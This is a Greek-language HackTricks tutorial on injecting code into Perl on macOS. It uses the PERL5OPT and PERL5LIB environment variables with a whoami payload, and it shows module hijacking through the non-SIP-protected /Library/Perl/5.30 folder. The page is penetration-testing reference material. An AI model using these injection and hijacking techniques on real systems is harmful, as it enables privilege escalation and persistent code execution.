# macOS Εισαγωγή σε Εφαρμογές Perl

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ καταθέτοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}

## Μέσω των μεταβλητών περιβάλλοντος `PERL5OPT` & `PERL5LIB`

Χρησιμοποιώντας τη μεταβλητή περιβάλλοντος PERL5OPT είναι δυνατή η εκτέλεση αυθαίρετων εντολών από το perl.\
Για παράδειγμα, δημιουργήστε αυτό το σενάριο:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Τώρα **εξαγάγετε τη μεταβλητή περιβάλλοντος** και εκτελέστε το **σενάριο perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Μια άλλη επιλογή είναι να δημιουργήσετε ένα Perl module (π.χ. `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

Και στη συνέχεια χρησιμοποιήστε τις μεταβλητές περιβάλλοντος:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Μέσω εξαρτήσεων

Είναι δυνατόν να αναφέρουμε τη σειρά του φακέλου εξαρτήσεων του Perl που εκτελείται:
```bash
perl -e 'print join("\n", @INC)'
```
Που θα επιστρέψει κάτι σαν:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Μερικοί από τους φακέλους που επιστρέφονται δεν υπάρχουν καν, ωστόσο, το **`/Library/Perl/5.30`** υπάρχει, δεν είναι προστατευμένο από το **SIP** και βρίσκεται πριν από τους φακέλους που προστατεύονται από το SIP. Συνεπώς, κάποιος θα μπορούσε να εκμεταλλευτεί αυτόν τον φάκελο για να προσθέσει εξαρτήσεις σε scripts εκεί, έτσι ώστε ένα Perl script υψηλής προνομιακής πρόσβασης να τις φορτώσει.

{% hint style="warning" %}
Ωστόσο, σημειώστε ότι **χρειάζεστε δικαιώματα ρίζας για να γράψετε σε αυτόν τον φάκελο** και σήμερα θα λάβετε αυτό το **TCC prompt**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Για παράδειγμα, αν ένα script εισάγει το **`use File::Basename;`** θα ήταν δυνατόν να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm` για να εκτελέσει αυθαίρετο κώδικα.

## Αναφορές

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
